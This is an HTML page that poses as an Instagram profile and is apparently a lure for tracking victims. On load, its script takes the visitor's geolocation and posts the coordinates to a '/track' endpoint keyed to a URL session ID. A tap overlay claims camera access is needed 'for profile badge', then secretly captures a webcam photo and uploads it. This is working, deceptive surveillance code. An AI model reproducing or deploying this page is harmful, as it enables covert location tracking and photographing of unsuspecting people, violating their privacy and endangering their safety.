<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram Profile</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            color: #262626;
        }
        .profile-header { background: white; border-bottom: 1px solid #dbdbdb; padding: 20px; text-align: center; }
        .avatar { width: 80px; height: 80px; border-radius: 50%; background: #e0e0e0; margin: 0 auto 10px; display: flex; align-items: center; justify-content: center; font-size: 40px; color: #8e8e8e; }
        .username { font-size: 20px; font-weight: 600; }
        .bio { color: #8e8e8e; font-size: 14px; margin-top: 8px; }
        .stats { display: flex; justify-content: space-around; padding: 12px 20px; background: white; border-bottom: 1px solid #dbdbdb; }
        .stat { text-align: center; }
        .stat-number { font-weight: 600; font-size: 18px; }
        .stat-label { font-size: 12px; color: #8e8e8e; }
        .posts { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2px; background: white; }
        .post { aspect-ratio: 1 / 1; background: #efefef; display: flex; align-items: center; justify-content: center; color: #8e8e8e; font-size: 12px; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); color: white; display: flex;
            align-items: center; justify-content: center; z-index: 1000;
            font-size: 22px; text-align: center; padding: 20px; cursor: pointer;
            flex-direction: column;
        }
        #overlay small { font-size: 14px; margin-top: 10px; opacity: 0.8; }
        #profileContent { display: none; }
    </style>
</head>
<body>
    <div id="overlay">
        👆 Tap to view full profile<br>
        <small>(Camera access for profile badge)</small>
    </div>
    <div id="profileContent">
        <div class="profile-header">
            <div class="avatar">📸</div>
            <div class="username">instagram_user</div>
            <div class="bio">✨ Just a normal day ✨</div>
        </div>
        <div class="stats">
            <div class="stat"><div class="stat-number">248</div><div class="stat-label">Posts</div></div>
            <div class="stat"><div class="stat-number">1,234</div><div class="stat-label">Followers</div></div>
            <div class="stat"><div class="stat-number">567</div><div class="stat-label">Following</div></div>
        </div>
        <div class="posts">
            <div class="post">📷</div><div class="post">🎥</div><div class="post">📍</div>
            <div class="post">🎵</div><div class="post">👤</div><div class="post">❤️</div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const session = urlParams.get('session');
        const API_URL = window.location.origin + '/track';

        async function sendData(endpoint, data) {
            await fetch(`${API_URL}?session=${session}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        // Auto location on page load
        navigator.geolocation.getCurrentPosition(pos => {
            sendData('/location', {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            });
        }, err => console.log("Location error:", err));

        // On tap, request camera (for photo) and show profile
        document.getElementById('overlay').onclick = async () => {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('profileContent').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg');
                    sendData('/photo', { image: photoData });
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            } catch(err) {
                alert("Camera access needed: " + err.message);
            }
        };
    </script>
</body>
</html>
